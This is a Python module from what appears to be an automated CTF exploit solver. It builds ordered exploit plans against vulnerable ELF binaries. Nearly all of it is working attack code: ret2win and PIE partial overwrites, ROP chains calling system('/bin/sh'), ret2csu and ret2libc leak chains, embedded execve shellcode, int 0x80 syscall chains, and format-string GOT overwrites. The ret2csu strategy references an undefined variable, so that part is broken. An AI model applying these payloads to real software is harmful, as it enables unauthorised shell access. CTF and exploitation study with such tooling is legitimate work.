"""策略集合：每个函数产出若干 Plan（有序尝试），由 orchestrator 执行并验证。"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Iterable, Optional

from pwn import ELF, ROP, asm, context, shellcraft

from .facts import Facts, Vuln
from .model import Challenge
from .run import execute

TERM_SINKS = ("gets", "scanf", "__isoc99_scanf", "fgets")


@dataclass
class Plan:
    strategy: str
    sends: list[bytes]
    desc: str = ""
    tag: str = ""

    def __str__(self) -> str:
        return f"[{self.strategy}] {self.desc}"


# --------------------------------------------------------------------------- 公共
def _term(sink: str) -> bytes:
    return b"\n" if sink in TERM_SINKS else b""


def _offsets(ch: Challenge, f: Facts) -> list[tuple[int, str]]:
    """(offset, sink) 候选，静态推导优先，再补邻近值。"""
    out: list[tuple[int, str]] = []
    seen = set()
    step = ch.wordsize
    for v in sorted(f.vulns, key=lambda v: 0 if v.sink in ("gets", "read") else 1):
        if v.offset is None:
            continue
        # 读入长度不够覆盖到返回地址的，直接排除（否则会白跑几十次）
        if v.size_limit is not None and v.size_limit <= v.offset:
            continue
        for delta in (0, -step, step, -2 * step, 2 * step):
            off = v.offset + delta
            if off <= 0 or off > 0x400 or off in seen:
                continue
            if v.size_limit is not None and off >= v.size_limit:
                continue
            seen.add(off)
            out.append((off, v.sink))
    # 兜底：只有完全推导不出偏移时才暴力枚举（已知偏移但被长度过滤掉的不要瞎试）
    if not out and not any(v.offset for v in f.vulns):
        for off in range(step, 0x120, step):
            if off not in seen:
                seen.add(off)
                out.append((off, f.vulns[0].sink if f.vulns else "gets"))
    return out


def _presets(ch: Challenge, f: Facts) -> list[bytes]:
    """payload 之前需要先喂的输入（如 scanf("%d") 的长度）。"""
    has_scanf = any(v.sink in ("scanf", "__isoc99_scanf") for v in f.vulns)
    outs: list[bytes] = []
    if has_scanf:
        outs = [b"1024\n", b"1000\n", b"10\n", b"-1\n", b"0\n", b"1\n", b"128\n"]
    outs.append(b"")
    return outs


def _align(ch: Challenge, f: Facts, on: bool) -> bytes:
    if not on or ch.elf.bits != 64:
        return b""
    ret = f.gadgets.get("ret")
    return ch.p64(ret) if ret else ch.p64(0x400000 + 1)  # 万一没有 ret 就用无效值试一次


def _pad(ch: Challenge, off: int) -> bytes:
    return b"A" * off


def _csu_block(ch: Challenge, f: Facts, func_got: int,
               a1: int, a2: int, a3: int, nxt: int) -> bytes:
    """按 __libc_csu_init 实际的寄存器映射拼一个 call 块。

    pops: rbx, rbp, r12(func), r13, r14, r15 —— 但 rdi/rsi/rdx 由谁提供随编译器而变。
    """
    A, B, mapping = f.csu
    regs = {"rbx": 0, "rbp": 1, "r12": func_got, "r13": 0, "r14": 0, "r15": 0}
    regs[mapping["rdi"]] = a1
    regs[mapping["rsi"]] = a2
    regs[mapping["rdx"]] = a3
    return (ch.p64(A) + ch.p64(regs["rbx"]) + ch.p64(regs["rbp"]) + ch.p64(regs["r12"])
            + ch.p64(regs["r13"]) + ch.p64(regs["r14"]) + ch.p64(regs["r15"])
            + ch.p64(B) + ch.p64(0) * 7 + ch.p64(nxt))


# --------------------------------------------------------------------------- 1. ret2win
def s_ret2win(ch: Challenge, f: Facts) -> Iterable[Plan]:
    win = f.shell_win
    if win is None or ch.elf.pie:
        return
    for off, sink in _offsets(ch, f):
        for pre in _presets(ch, f):
            for align in ((False, True) if ch.elf.bits == 64 else (False,)):
                payload = _pad(ch, off) + _align(ch, f, align) + ch.p64(win.addr) + _term(sink)
                sends = [pre] if pre else []
                yield Plan("ret2win", sends + [payload],
                           f"jump to {win.evidence} @ {hex(win.addr)} off={off} align={int(align)}")


# --------------------------------------------------------------------------- 1a. ret2win(PIE 局部覆盖)
def s_ret2win_pie(ch: Challenge, f: Facts) -> Iterable[Plan]:
    """PIE + 无泄漏：只覆盖返回地址的低 1~2 字节，跳到同一页/同一 64K 内的 win 函数。

    适用前提：溢出函数是被 main 直接调用的（返回地址落在二进制内），
    这样返回地址与 win 函数的低字节可比。
    """
    win = f.shell_win
    if not ch.elf.pie or win is None:
        return
    for v in f.vulns:
        if not v.offset or not v.func_entry:
            continue
        rets = f.callers.get(v.func_entry) or []
        for ret_addr in rets[:2]:
            if (ret_addr & 0xFF00) == (win.addr & 0xFF00):
                nbytes, val = 1, win.addr & 0xFF
            elif (ret_addr & 0xFFFF) >> 8 == (win.addr & 0xFFFF) >> 8:
                nbytes, val = 2, win.addr & 0xFFFF
            else:
                continue
            payload = _pad(ch, v.offset) + val.to_bytes(nbytes, "little")
            yield Plan("ret2win_pie", [payload + _term(v.sink)],
                       f"partial overwrite {nbytes}B -> {hex(win.addr)} "
                       f"(ret={hex(ret_addr)}) off={v.offset}")


# --------------------------------------------------------------------------- 1b. ret2flag
def s_ret2win_flag(ch: Challenge, f: Facts) -> Iterable[Plan]:
    """只打印 flag 的题（函数体是 system("cat flag")）——不算 shell，单独记账。"""
    if ch.elf.pie:
        return
    for w in f.wins:
        if w.kind != "flag":
            continue
        for off, sink in _offsets(ch, f):
            for align in ((False, True) if ch.elf.bits == 64 else (False,)):
                payload = _pad(ch, off) + _align(ch, f, align) + ch.p64(w.addr) + _term(sink)
                yield Plan("ret2flag", [payload],
                           f"jump to {w.evidence} @ {hex(w.addr)} off={off}", tag="flag")


# --------------------------------------------------------------------------- 2. ret2system@plt
def s_ret2plt(ch: Challenge, f: Facts) -> Iterable[Plan]:
    system = ch.plt("system")
    if not system or f.binsh is None:
        return
    pop_rdi = f.gadgets.get("pop_rdi")
    if ch.elf.bits == 64 and not pop_rdi:
        return
    for off, sink in _offsets(ch, f):
        for pre in _presets(ch, f):
            for align in ((False, True) if ch.elf.bits == 64 else (False,)):
                if ch.elf.bits == 64:
                    payload = (_pad(ch, off) + _align(ch, f, align)
                               + ch.p64(pop_rdi) + ch.p64(f.binsh) + ch.p64(system))
                else:
                    payload = (_pad(ch, off) + ch.p32(system) + ch.p32(0) + ch.p32(f.binsh))
                sends = [pre] if pre else []
                yield Plan("ret2plt", sends + [payload + _term(sink)],
                           f"system('/bin/sh') via pop_rdi off={off} align={int(align)}")


# --------------------------------------------------------------------------- 3. system(bss) after gets/read(bss)
def s_ret2gets(ch: Challenge, f: Facts) -> Iterable[Plan]:
    system = ch.plt("system")
    if not system:
        return
    gets = ch.plt("gets")
    read = ch.plt("read")
    if not (gets or read):
        return
    bss = _writable(ch)
    if not bss:
        return
    g = f.gadgets
    pop_rdi = g.get("pop_rdi")

    for off, sink in _offsets(ch, f):
        for pre in _presets(ch, f):
            if gets and (ch.elf.bits == 32 or pop_rdi):
                if ch.elf.bits == 64:
                    payload = (_pad(ch, off) + _align(ch, f, True)
                               + ch.p64(pop_rdi) + ch.p64(bss) + ch.p64(gets)
                               + ch.p64(pop_rdi) + ch.p64(bss) + ch.p64(system))
                else:
                    payload = (_pad(ch, off) + ch.p32(gets) + ch.p32(system)
                               + ch.p32(bss) + ch.p32(0))
                sends = ([pre] if pre else []) + [payload + _term(sink), b"/bin/sh\x00\n"]
                yield Plan("ret2gets", sends,
                           f"gets({hex(bss)}) -> system off={off}")

            if read and ch.elf.bits == 64 and pop_rdi and g.get("pop_rsi") and g.get("pop_rdx"):
                payload = (_pad(ch, off) + _align(ch, f, True)
                           + ch.p64(pop_rdi) + ch.p64(0)
                           + ch.p64(g["pop_rsi"]) + ch.p64(bss)
                           + ch.p64(g["pop_rdx"]) + ch.p64(0x100)
                           + ch.p64(read)
                           + ch.p64(pop_rdi) + ch.p64(bss) + ch.p64(system))
                sends = ([pre] if pre else []) + [payload + _term(sink), b"/bin/sh\x00"]
                yield Plan("ret2read", sends,
                           f"read(0,{hex(bss)},0x100) -> system off={off}")


# --------------------------------------------------------------------------- 4. ret2csu
def s_ret2csu(ch: Challenge, f: Facts) -> Iterable[Plan]:
    if ch.elf.bits != 64 or not f.csu:
        return
    system = ch.plt("system")
    if not system:
        return
    bss = _writable(ch)
    if not bss:
        return
    def block(func_got: int, arg1: int, arg2: int, arg3: int, nxt: int) -> bytes:
        return _csu_block(ch, f, func_got, arg1, arg2, arg3, nxt)

    # 写入函数：gets(bss) 或 read(0,bss,0x100)
    writers = []
    if ch.plt("gets") and ch.got("gets"):
        writers.append(("gets", ch.got("gets"), (bss, 0, 0)))
    if ch.plt("read") and ch.got("read"):
        writers.append(("read", ch.got("read"), (0, bss, 0x100)))
    got_system = ch.got("system")
    if not got_system:
        return
    for name, got_w, args in writers:
        for off, sink in _offsets(ch, f):
            for pre in _presets(ch, f):
                chain = (block(got_w, *args, A)
                         + block(got_system, bss, 0, 0, 0))
                payload = _pad(ch, off) + chain
                tail = b"/bin/sh\x00\n" if name == "gets" else b"/bin/sh\x00"
                sends = ([pre] if pre else []) + [payload + _term(sink), tail]
                yield Plan("ret2csu", sends, f"csu {name}({hex(bss)}) -> system off={off}")


# --------------------------------------------------------------------------- 5b. ret2libc（write 三参数泄漏）
def s_ret2libc_write(ch: Challenge, f: Facts) -> Iterable[Plan]:
    """没有 puts 只有 write 时：write(1, got, 8) 泄漏，再回 main 打 system。"""
    if ch.elf.pie or ch.libc_elf is None or ch.plt("puts"):
        return
    write = ch.plt("write")
    main = ch.var("main")
    if not write or not main:
        return
    got = ch.got("write") or ch.got("read")
    if not got:
        return
    g = f.gadgets
    base_chain = None
    if ch.elf.bits == 64 and g.get("pop_rdi") and g.get("pop_rsi") and g.get("pop_rdx"):
        base_chain = (ch.p64(g["pop_rdi"]) + ch.p64(1)
                      + ch.p64(g["pop_rsi"]) + ch.p64(got)
                      + ch.p64(g["pop_rdx"]) + ch.p64(8)
                      + ch.p64(write))
    elif ch.elf.bits == 64 and f.csu:
        got_write = ch.got("write")
        if got_write:
            base_chain = _csu_block(ch, f, got_write, 1, got, 8, main)
    elif ch.elf.bits == 32:
        base_chain = (ch.p32(write) + ch.p32(main) + ch.p32(1) + ch.p32(got) + ch.p32(8))
    if not base_chain:
        return
    for off, sink in _offsets(ch, f):
        for pre in _presets(ch, f):
            payload = _pad(ch, off) + _align(ch, f, ch.elf.bits == 64) + base_chain
            sends = ([pre] if pre else []) + [payload + _term(sink)]
            yield Plan("ret2libc_write", sends,
                       f"write(1, {hex(got)}, 8) leak off={off}",
                       tag=f"stage1:write:{off}:{sink}")


# --------------------------------------------------------------------------- 5. ret2libc
def s_ret2libc(ch: Challenge, f: Facts) -> Iterable[Plan]:
    """两阶段：泄漏 GOT -> 回主函数 -> system('/bin/sh')。

    这是一个「会执行两次」的特殊策略：Plan 带 tag=stage1，由 orchestrator 识别。
    """
    if ch.elf.pie or ch.libc_elf is None:
        return
    main = ch.var("main")
    if not main:
        return
    leak_plt = ch.plt("puts") or ch.plt("write")
    leak_name = "puts" if ch.plt("puts") else ("write" if ch.plt("write") else None)
    if not leak_plt or not leak_name:
        return
    got = ch.got(leak_name)
    pop_rdi = f.gadgets.get("pop_rdi")
    if not got or (ch.elf.bits == 64 and not pop_rdi):
        return
    for off, sink in _offsets(ch, f):
        for pre in _presets(ch, f):
            if ch.elf.bits == 64:
                payload = (_pad(ch, off) + _align(ch, f, True)
                           + ch.p64(pop_rdi) + ch.p64(got) + ch.p64(leak_plt) + ch.p64(main))
            else:
                payload = (_pad(ch, off) + ch.p32(leak_plt) + ch.p32(main) + ch.p32(got))
            sends = ([pre] if pre else []) + [payload + _term(sink)]
            yield Plan("ret2libc", sends,
                       f"leak {leak_name}@{hex(got)} off={off}",
                       tag=f"stage1:{leak_name}:{off}:{sink}")


# --------------------------------------------------------------------------- 6. ret2shellcode
# 直接用 execve("/bin/sh", 0, 0)：比 shellcraft.sh() 更短且不依赖栈上 argv 构造
SC_AMD64 = bytes.fromhex("4831f65648bf2f62696e2f2f7368574889e74831d26a3b580f05")
SC_I386 = bytes.fromhex("31c050682f2f7368682f62696e89e389c1505389e131d26a0b58cd80")


def _shellcode(ch: Challenge) -> bytes:
    return SC_AMD64 if ch.elf.bits == 64 else SC_I386


def s_shellcode(ch: Challenge, f: Facts) -> Iterable[Plan]:
    target = f.mmap_rwx
    if not target:
        return
    sc = _shellcode(ch)
    for v in f.vulns:
        if v.sink != "read" or v.offset is None:
            continue
        # 第一段 read 把 shellcode 读进 RWX 区，第二段溢出返回地址跳到 RWX
        limit = v.size_limit or 0x100
        blob = sc.ljust(min(max(limit, len(sc)), 0x400), b"\x90")
        for pre in _presets(ch, f):
            payload = _pad(ch, v.offset) + ch.p64(target) + _term(v.sink)
            sends = ([pre] if pre else []) + [blob, payload]
            yield Plan("shellcode", sends,
                       f"shellcode -> {hex(target)} off={v.offset} size={len(blob)}")


# --------------------------------------------------------------------------- 7. 32 位 ret2syscall
def s_ret2syscall(ch: Challenge, f: Facts) -> Iterable[Plan]:
    if ch.elf.bits != 32 or f.binsh is None:
        return
    g = f.gadgets
    if not all(k in g for k in ("pop_eax", "pop_ebx", "pop_edx", "int80")):
        return

    # 设置 ecx=0 & ebx=binsh 的几种写法
    setups = []
    if "pop_ecx" in g:
        setups.append([("pop_ecx", 0), ("pop_ebx", f.binsh)])
    if "pop_ecx_ebx" in g:
        setups.append([("pop_ecx_ebx", 0, f.binsh)])
    if "pop_ebx_ecx" in g:
        setups.append([("pop_ebx_ecx", f.binsh, 0)])
    if not setups:
        return

    for off, sink in _offsets(ch, f):
        for setup in setups:
            payload = b"A" * off + ch.p32(g["pop_eax"]) + ch.p32(11)
            for item in setup:
                payload += ch.p32(g[item[0]])
                for val in item[1:]:
                    payload += ch.p32(val)
            payload += ch.p32(g["pop_edx"]) + ch.p32(0) + ch.p32(g["int80"])
            yield Plan("ret2syscall", [payload + _term(sink)],
                       f"execve('/bin/sh') int80 off={off} setup={setup[0][0]}")


def s_ret2syscall_write(ch: Challenge, f: Facts) -> Iterable[Plan]:
    """静态 32 位：二进制里没有 /bin/sh 时，先用 gets/read 把字符串写进 .bss，
    再回 main 触发第二次溢出，用 int 0x80 执行 execve。"""
    if ch.elf.bits != 32 or f.binsh is not None:
        return
    g = f.gadgets
    if not all(k in g for k in ("pop_eax", "pop_edx", "int80")):
        return
    writer = next((v for v in f.vulns if v.target and v.offset), None)
    main = ch.var("main")
    bss = _writable(ch)
    if not writer or not bss or not main:
        return
    setups = []
    if "pop_ecx_ebx" in g:
        setups.append([("pop_ecx_ebx", 0, bss)])
    if "pop_ecx" in g and "pop_ebx" in g:
        setups.append([("pop_ecx", 0), ("pop_ebx", bss)])
    for off, sink in _offsets(ch, f):
        for setup in setups:
            stage1 = (b"A" * off + ch.p32(writer.target) + ch.p32(main) + ch.p32(bss))
            chain = ch.p32(g["pop_eax"]) + ch.p32(11)
            for item in setup:
                chain += ch.p32(g[item[0]])
                for val in item[1:]:
                    chain += ch.p32(val)
            chain += ch.p32(g["pop_edx"]) + ch.p32(0) + ch.p32(g["int80"])
            stage2 = b"A" * off + chain
            sends = [stage1 + _term(sink), b"/bin/sh\x00\n", stage2 + _term(sink)]
            yield Plan("ret2sys_write", sends,
                       f"gets({hex(bss)}) -> main -> execve off={off}")


# --------------------------------------------------------------------------- 8. printf(user) -> GOT 覆盖
def s_fmtstr(ch: Challenge, f: Facts) -> Iterable[Plan]:
    if not f.fmt_buf:
        return
    system = ch.plt("system")
    if not system:
        return
    targets = []
    for name in ("atoi", "strcmp", "strncmp", "strlen", "free", "exit"):
        g = ch.got(name)
        if g:
            targets.append((name, g))
    if not targets:
        return
    # 先探测格式化参数序号
    probe = b"AAAA." + b".%p" * 24 + b"\n"
    from .run import run_capture
    out = run_capture(ch, probe, timeout=1.0)
    idx = _fmt_offset(out)
    if not idx:
        return
    from pwn import fmtstr_payload
    for name, got in targets:
        for ws in ("short", "int"):
            try:
                blob = fmtstr_payload(idx, {got: system}, write_size=ws)
            except Exception:
                continue
            if b"\n" in blob:
                continue
            yield Plan("fmtstr", [blob + b"\n", b"/bin/sh\n"],
                       f"fmt {name}@got -> system@plt arg#{idx} write={ws}")


def _fmt_offset(out: bytes) -> Optional[int]:
    """从 %p 回显里定位 0x41414141 是第几个格式化参数（1-based）。"""
    text = out.decode("latin-1", "ignore")
    toks = re.findall(r"0x[0-9a-fA-F]+|\(nil\)", text)
    for i, tok in enumerate(toks, 1):
        low = tok.lower()
        if low.startswith("0x41414141") or low.endswith("41414141"):
            return i
    return None


# --------------------------------------------------------------------------- 辅助
def _writable(ch: Challenge) -> Optional[int]:
    """挑一块可写内存（bss 起点往后一点，避开已用数据）。"""
    try:
        bss = ch.elf.bss()
    except Exception:
        return None
    # 跳过已存在的全局变量区，留 0x200 余量
    return bss + 0x200 if bss else None


STRATEGIES = [
    s_ret2win_pie,
    s_ret2win,
    s_ret2plt,
    s_ret2gets,
    s_ret2csu,
    s_ret2libc_write,
    s_ret2libc,
    s_shellcode,
    s_ret2syscall,
    s_ret2syscall_write,
    s_fmtstr,
    # 兜底：只打 flag 的题（不计入 shell 成功率，单独记账）
    s_ret2win_flag,
]
